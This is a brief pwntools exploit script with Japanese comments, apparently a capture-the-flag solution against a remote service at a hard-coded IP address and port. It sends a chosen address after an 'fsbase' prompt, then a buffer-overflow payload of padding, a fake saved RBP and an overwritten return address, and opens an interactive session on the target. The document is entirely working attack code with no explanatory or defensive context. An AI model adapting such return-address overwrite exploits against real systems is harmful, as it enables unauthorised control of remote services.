from pwn import *



p = remote('34.170.146.252', 37571)
# 1回目の入力 (10進数文字列として送信)
target_addr = 0x404080  # 設定したいアドレス
p.sendlineafter(b"fsbase", str(target_addr).encode())

# 2回目の入力 (バイナリデータとしてパッキングして送信)
# p64(x) は数値 x を 64 ビットのリトルエンディアン形式に変換します
payload = b""
payload += b"A" * 8          # バッファ領域
payload += p64(0)            # 64ビット数値としての 0x0000000000000000
payload += b"B" * 8          # Saved RBP
payload += p64(0x004011b6)   # 64ビット数値としてのアドレス

p.sendafter(b"message> ", payload)


p.interactive()
